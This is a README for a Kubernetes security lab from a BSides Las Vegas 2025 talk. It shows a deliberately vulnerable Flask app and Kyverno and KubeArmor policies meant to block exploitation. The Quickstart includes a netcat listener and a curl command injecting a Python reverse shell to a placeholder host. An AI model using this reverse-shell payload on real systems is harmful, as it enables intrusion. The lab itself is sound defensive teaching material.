# Kubernetes Enforcement Lab

This repo contains the full scenario from the **BSides Las Vegas 2025** talk: _"Detect and Respond? Cool Story — or Just Don’t Let the Bad Stuff Start."_

We walk through an end-to-end Kubernetes security journey using a vulnerable Flask app, and explore how tools like **Kyverno**, **KubeArmor**, and **eBPF detection** can prevent or detect runtime threats.

---

## Directory Structure

\`\`\`
k8s-enforcement-lab/
├── RootDockerfile                     # Vulnerable app container with root
├── NonRootDockerfile                  # Vulnerable app container without root
├── app.py                             # Flask app with OS command injection
├── templates/                         # HTML for test payloads
├── manifests/                         # Various Tests and Policies
│   ├── insecure.yaml                  # Insecure workload spec (runs as root) and NodePort Service
│   ├── kyverno-block-root.yaml        # Kyverno policy to block insecure pods
│   └── kubearmor-mailroom-locks.yaml  # KubeArmor policy to restrict runtime behavior
├── README.md
\`\`\`

---

## App
The app is a basic Python Flask server with an OS command injection vulnerability at \`/cmd\`. It simulates a realistic reverse shell scenario. The containers in the manifests are in Dockerhub so you don't have to create images if you so desire. All of this has been tested in a Kubeadm cluster with no problems.

## Scenarios
Each directory in \`manifests/\` shows a different security stage:
- **insecure.yaml**: Baseline Workload — no security controls
- **secure.yaml**: Secure Workload - disallow root containers
- **kyverno-block-root.yaml**: Admission control with Kyverno
- **kubearmor-mailroom-locks.yaml**: Runtime enforcement with KubeArmor

---

## Talk Slides
- [BSides Las Vegas 2025 PDF](./BSidesLV2025_Talk.pdf)

---

## Related Blog Posts @ [cloudsecburrito.com](https://cloudsecburrito.com)

- [📘 Setting Up Your Lab Cluster](https://cloudsecburrito.com/lab-cluster-setup)
- [🔧 Blocking Root Containers with Kyverno](https://cloudsecburrito.com/kyverno-part-2)
- [🔐 Locking Down Runtime Behavior with KubeArmor](https://cloudsecburrito.com/kubearmor-series)

---

## Quickstart (the slides show all the scenarios but this might be helpful)

### Deploy Vulnerable Workload and Service
\`\`\`bash
kubectl apply -f manifests/insecure.yaml
\`\`\`

### Run the hack
Listener in one terminal assuming Mac:
\`\`\`bash
nc -l 4444
\`\`\`

RCE in other terminal:
\`\`\`bash
curl "http://\"app_ip_address\":30080/cmd" \
  --get \
  --data-urlencode 'input=python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"host_ip_address\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")"'
\`\`\`

### For full root block:
\`\`\`bash
kubectl apply -f manifests/kyverno-block-root.yaml
\`\`\`

### Deploy Non Root workload:
\`\`\`bash
kubectl apply -f manifests/secure.yaml
\`\`\`

### Create runtime enforcement policy:
\`\`\`bash
kubectl apply -f manifests/kubearmor-mailroom-locks.yaml
\`\`\`

### Test runtime enforcement policy:
\`\`\`bash
kubectl apply -f manifests/secure.yaml
\`\`\`

### Reuse RCE and try to start Python listener or write to tmp

---

## Credit
Created by [Matt Brown](https://cloudsecburrito.com) — for BSidesLV 2025
